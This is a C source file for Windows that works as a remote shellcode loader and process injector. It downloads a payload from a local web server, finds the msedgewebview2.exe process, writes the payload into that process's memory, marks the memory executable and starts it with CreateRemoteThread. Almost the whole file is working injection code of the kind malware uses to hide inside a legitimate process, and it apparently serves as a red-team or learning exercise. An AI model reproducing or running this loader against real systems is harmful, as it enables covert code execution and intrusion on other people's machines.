#include <stdio.h>
#include <Windows.h>
#include <wininet.h>
#include <Tlhelp32.h>
#pragma comment(lib,"wininet.lib")

BOOL UrlFetch(PBYTE* payload, SIZE_T* PayloadSize, LPWSTR url) {
	HINTERNET hInet = NULL, hInetUrl = NULL;
	PBYTE pByte = NULL, pTmpByte = NULL;
	SIZE_T size = NULL;
	DWORD dwBytesRead = NULL;

	hInet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
	if (hInet == NULL) {
		printf("[-] Internet Open Failed\n");
		return FALSE;
	}

	hInetUrl = InternetOpenUrlW(hInet, url, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	if (hInetUrl == NULL) {
		printf("[-] Internet OpenURL Failed\n");
		return FALSE;
	}

	pTmpByte = (PBYTE)LocalAlloc(LPTR, 1024);
	if (pTmpByte == NULL) {
		printf("[-] Tmp mem alloc failed\n");
		return FALSE;
	}

	while (TRUE) {
		if (!InternetReadFile(hInetUrl, pTmpByte, 1024, &dwBytesRead)) {
			printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
			return FALSE;
		}

		size += dwBytesRead;

		if (pByte == NULL)
			pByte = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
		else
			pByte = (PBYTE)LocalReAlloc(pByte, size, LMEM_MOVEABLE | LMEM_ZEROINIT);

		if (pByte == NULL)
			return FALSE;

		memcpy((PVOID)(pByte + (size - dwBytesRead)), pTmpByte, dwBytesRead);
		memset(pTmpByte, '\0', dwBytesRead);

		if (dwBytesRead < 1024)
			break;
	}

	*payload = pByte;
	*PayloadSize = size;

	if (hInet)
		InternetCloseHandle(hInet);
	if (hInetUrl)
		InternetCloseHandle(hInetUrl);
	if (hInet)
		InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
	if (pTmpByte)
		LocalFree(pTmpByte);
	return TRUE;
}

BOOL ProcEnum(LPWSTR ProcName, DWORD* dwProcessId, HANDLE* hProcess) {
	HANDLE snap = NULL;
	snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snap == INVALID_HANDLE_VALUE) {
		printf("[-] SnapShot Error: %d\n", GetLastError());
		goto _End;
	}

	PROCESSENTRY32 Proc;
	Proc.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(snap, &Proc)) {
		printf("[-] Process32First Error: %d\n", GetLastError());
		goto _End;
	}

	do {
		if (wcscmp(ProcName, Proc.szExeFile) == 0) {
			*dwProcessId = Proc.th32ProcessID;
			*hProcess = OpenProcess(PROCESS_ALL_ACCESS, NULL, Proc.th32ProcessID);
			if (hProcess == NULL) {
				printf("[-] OpenProcess Error: %d\n", GetLastError());
				goto _End;
			}
			break;
		}
	} while (Process32Next(snap, &Proc));

_End:
	if (snap != NULL)
		CloseHandle(snap);
	if (*dwProcessId == 0 || *hProcess == NULL)
		return FALSE;
	return TRUE;
}

BOOL Inject(HANDLE hProcess, PBYTE payload, SIZE_T PayloadSize) {
	PVOID payloadaddr = NULL;
	SIZE_T bytewritten = NULL;
	DWORD dwOldProtection = NULL;

	printf("[i] Allocating Memory in Remote Process\n");
	payloadaddr = VirtualAllocEx(hProcess, NULL, PayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (payloadaddr == NULL) {
		printf("[-] VirtualAllocEx Failed with Error: %d\n", GetLastError());
		return FALSE;
	}
	printf("[+] Allocation Done\n");

	printf("[#] Press <Enter> to Write Payload...");

	if (!WriteProcessMemory(hProcess, payloadaddr, payload, PayloadSize, &bytewritten) || bytewritten != PayloadSize) {
		printf("[-] WriteProcessMemory Failed : %d\n", GetLastError());
		return FALSE;
	}
	printf("[+] WriteProcessMemory Done!!!\n");

	memset(payload, '\0', PayloadSize);

	if (!VirtualProtectEx(hProcess, payloadaddr, PayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[-] VirtualProtectEx Failed: %d\n", GetLastError());
		return FALSE;
	}

	printf("[#] Press <Enter> To Run....");

	printf("[i] Executing Payload\n");

	if (CreateRemoteThread(hProcess, NULL, NULL, payloadaddr, NULL, NULL, NULL) == NULL) {
		printf("[-] CreateRemoteThread Failed: %d\n", GetLastError());
		return FALSE;
	}
	printf("[+] DONE!!!!\n");
	return TRUE;
}

int main(void) {
	PBYTE payload = NULL;
	SIZE_T size = NULL;
	LPWSTR url = L"http://127.0.0.1:8000/tcp.bin";
	HANDLE hProcess = NULL;
	DWORD dwProcessId = NULL;
	LPWSTR ProcName = L"msedgewebview2.exe";
	DWORD InetConnection = NULL;

	while (!InternetGetConnectedState(&InetConnection, 0)) {
		printf("[-] Not Connected to Internet\n");
		Sleep(10000);
	}
	printf("<Enter> to start web fetch");

	if (!UrlFetch(&payload, &size, url)) {
		printf("[-] UrlFetch Error\n");
	}

	printf("[+] Payload at: 0x%p\n", payload);

	printf("[#] Starting Proc Enum press <enter>\n");


	do {
		printf("[-] ProcEnum Failed Trying Again\n");

	} while (!ProcEnum(ProcName, &dwProcessId, &hProcess));
	printf("Process Number: %d\n", dwProcessId);

	printf("[#] Press <Enter> to Start Injection");

	Inject(hProcess, payload, size);

	printf("<ENTER> TO QUIT....");

	return 0;
}